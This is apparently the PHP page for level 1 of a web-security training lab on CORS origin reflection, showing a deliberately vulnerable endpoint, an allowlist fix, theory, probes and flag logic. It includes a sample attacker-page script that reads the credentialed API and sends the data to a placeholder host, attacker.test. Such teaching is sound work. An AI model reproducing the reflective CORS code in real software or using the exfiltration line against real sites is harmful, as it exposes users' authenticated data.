<?php
require_once __DIR__ . '/helpers.php';

$L    = 1;
$meta = bp_levels()[$L];

$submitted = isset($_POST['origin']);
$origin    = bp_single_line((string)($_POST['origin'] ?? ''));
$flag      = '';
$result    = '';
$pipeline  = [];
$boxes     = '';

if ($submitted) {

    // A real request to a real endpoint, with the Origin the learner supplied
    // and the session cookie attached. Everything below reads that response.
    $res     = bp_cors_request($L, $origin);
    $verdict = cors_browser_verdict($origin, $res['map']);

    $host    = cors_origin_host($origin);
    $outside = $host !== '' && !cors_is_internal_host($host);

    $pipeline = array_merge([
        [
            'label' => 'request header: Origin',
            'value' => $origin === '' ? '(no Origin header sent)' : $origin,
            'note'  => 'Sent to <code>' . lk_esc(bp_internal_base()) . '/api.php?level=1</code> together with '
                     . '<code>Cookie: hl_session=&hellip;</code>.',
        ],
        [
            'label' => '$_SERVER["HTTP_ORIGIN"] copied into the response',
            'value' => $origin === '' ? '(the if() was skipped, so no CORS headers are emitted)' : $origin,
            'note'  => 'There is no comparison between these two stages. The request header became the response header.',
        ],
    ], bp_cors_tail_stages($origin, $res, $verdict));

    $boxes = bp_headers_box($res['raw'])
           . ($verdict['readable'] && $verdict['credentialed'] ? bp_body_box($res['body']) : '');

    if ($verdict['readable'] && $verdict['credentialed'] && $outside) {
        $flag   = bp_flag($L);
        $result = bp_verdict(true,
            'The API granted <code>' . lk_esc($origin) . '</code> a credentialed read. '
            . 'That origin is not part of <code>hackinlab.internal</code>, and nothing about it was ever approved.');
    } elseif ($verdict['readable'] && $verdict['credentialed']) {
        $result = bp_verdict(false,
            'Granted, but <code>' . lk_esc($host) . '</code> is inside the company domain, so this proves nothing an '
            . 'operator would not expect. Send an origin that is plainly yours.');
    } elseif ($origin === '') {
        $result = bp_verdict(false,
            'No Origin header was sent, so the <code>if</code> never ran and the response carries no CORS headers. '
            . 'This is the baseline every other answer is compared against.');
    } elseif ($host === '') {
        $result = bp_verdict(false,
            'That is not a syntactic origin. A browser sends a scheme and a host, for example '
            . '<code>https://attacker.test</code>, with no path and no trailing slash.');
    } else {
        $result = bp_verdict(false, $verdict['note']);
    }
}

$code = <<<'PHP'
// GET /api.php?level=1
// "The single-page app moved to its own hostname and CORS broke.
//  This unblocked it."
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';

if ($origin !== '') {
    header('Access-Control-Allow-Origin: ' . $origin);
    header('Access-Control-Allow-Credentials: true');
    header('Vary: Origin');
}

header('Content-Type: application/json');
echo account_json(session_is_authenticated());
PHP;

$fixBad = <<<'PHP'
header('Access-Control-Allow-Origin: ' . $_SERVER['HTTP_ORIGIN']);
header('Access-Control-Allow-Credentials: true');
PHP;

$fixGood = <<<'PHP'
// An allowlist is a set of full origin strings and an equality test.
// Nothing is derived from the request except the lookup key.
const ALLOWED = [
    'https://portal.hackinlab.internal',
    'https://admin.hackinlab.internal',
];

$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
if (in_array($origin, ALLOWED, true)) {
    header('Access-Control-Allow-Origin: ' . $origin);
    header('Access-Control-Allow-Credentials: true');
}
// Vary: Origin belongs here either way, so caches never serve one
// origin's allow header to another.
header('Vary: Origin');
PHP;

lk_page([
    'lab'        => bp_lab(),
    'level'      => $L,
    'title'      => $meta['title'],
    'difficulty' => $meta['difficulty'],
    'extra_head' => bp_extra_head(),

    'code'       => $code,
    'vuln_lines' => [7, 8],
    'annotation' => 'The response header is built from the request header. Whatever origin asks is the origin that
        gets approved, and <code>Access-Control-Allow-Credentials: true</code> means the request that asked was
        carrying the victim&rsquo;s cookies.',

    'theory' => '<p>The same-origin policy stops one site reading another site&rsquo;s responses. CORS is the
        mechanism a server uses to make an exception, and the exception is expressed in one header:
        <code>Access-Control-Allow-Origin</code>. The browser enforces it; the server decides it.</p>
        <p>Because the header can only name a single origin (or the wildcard), a server that supports several
        origins has to look at the request and choose. That step is where reflection creeps in: echoing
        <code>Origin</code> makes every client work on the first try, and every test passes, because the developer
        only ever tests with origins that should be allowed.</p>
        <p>Reflection on its own is a lesser bug &mdash; it exposes what an unauthenticated visitor could fetch
        anyway. It becomes serious the moment <code>Access-Control-Allow-Credentials: true</code> joins it, because
        now the attacker&rsquo;s page reads responses rendered for the logged-in victim. Note that the wildcard
        cannot be paired with credentials at all; browsers refuse that combination. Reflection is the way developers
        get the effect of a wildcard while keeping credentials, which is exactly the combination the spec was
        written to prevent.</p>',

    'fix' => [
        'bad'  => $fixBad,
        'good' => $fixGood,
        'note' => 'Two habits close this whole class: compare complete origin strings with <code>===</code> or
            <code>in_array($o, $list, true)</code>, and keep the list in configuration rather than deriving it from
            the request. If the list has to be dynamic, look the origin up in a store &mdash; a lookup that returns
            nothing is a refusal, which is the behaviour you want by default.',
    ],

    'scenario' => '<strong>Scenario:</strong> <code>api.hackinlab.internal</code> serves account data to a
        single-page app. Someone fixed a CORS error during a release by echoing the request origin.
        <br><strong>Goal:</strong> get the API to grant <em>your</em> origin a credentialed read, and watch the
        account data come back.',

    'model' => [
        'title' => 'The two headers that decide everything',
        'html'  => '<table class="lk-kv">
            <tr><td><code>Origin</code></td><td>request header, set by the browser, not by script. It names the
                origin of the page that made the request.</td></tr>
            <tr><td><code>Access-Control-Allow-Origin</code></td><td>response header. One origin, or <code>*</code>.
                If it does not match the requesting origin, script cannot read the body.</td></tr>
            <tr><td><code>Access-Control-Allow-Credentials</code></td><td>response header. <code>true</code> means
                the browser may send cookies with the request and hand the response to script.</td></tr>
        </table>
        <p>What an attacker page does with all three:</p>
        <div class="source-code"><pre><code>fetch(\'https://api.hackinlab.internal/api.php?level=1\', { credentials: \'include\' })
  .then(r =&gt; r.text()).then(d =&gt; navigator.sendBeacon(\'https://attacker.test/log\', d));</code></pre></div>
        <p>The form below does the server half of that for you: it sends a genuine request with the Origin you type
        and shows the genuine response headers.</p>',
    ],

    'form'     => bp_origin_form($L, $origin),
    'result'   => $result . $boxes,
    'flag'     => $flag,
    'flag_msg' => 'An origin nobody approved was handed authenticated data.',
    'why'      => '<p>Stage 2 of the trace is the finding. The value in <code>Access-Control-Allow-Origin</code> is
        the value you put in <code>Origin</code>, because the code copies one into the other with no test in
        between. An allowlist that accepts every input is not an allowlist.</p>
        <p>The credentials header is what turns this into account takeover material rather than a curiosity. The
        response that came back was rendered for a live session, and it contains an API key. Any page the victim visits
        could have fetched it.</p>
        <p>When you review a CORS implementation, search for the response header and then look upwards: if the value
        can be traced back to the request without passing through an equality test, you are finished.</p>',

    'pipeline' => $pipeline,
    'probes'   => [
        'param'  => 'origin',
        'method' => 'POST',
        'action' => 'level1.php',
        'items'  => [
            ['q'       => 'What does the endpoint answer with no Origin at all?',
             'payload' => '',
             'learn'   => 'The baseline. A same-origin request carries no Origin header, so this is the response the '
                        . 'application itself sees, with no CORS headers attached.'],
            ['q'       => 'Does the real origin get the expected answer?',
             'payload' => 'https://portal.hackinlab.internal',
             'learn'   => 'Confirms the endpoint is CORS-enabled at all and shows you what a legitimate grant looks '
                        . 'like, which is the shape you will be comparing against.'],
            ['q'       => 'Is the allow header a fixed string or a copy of my request?',
             'payload' => 'https://portal.hackinlab.internal.test',
             'learn'   => 'A near-miss origin. If the response echoes this back, the server is not comparing anything '
                        . '&mdash; and you have learned that without sending anything that looks like an attack.'],
        ],
    ],
    'hints' => bp_hints($L),
]);
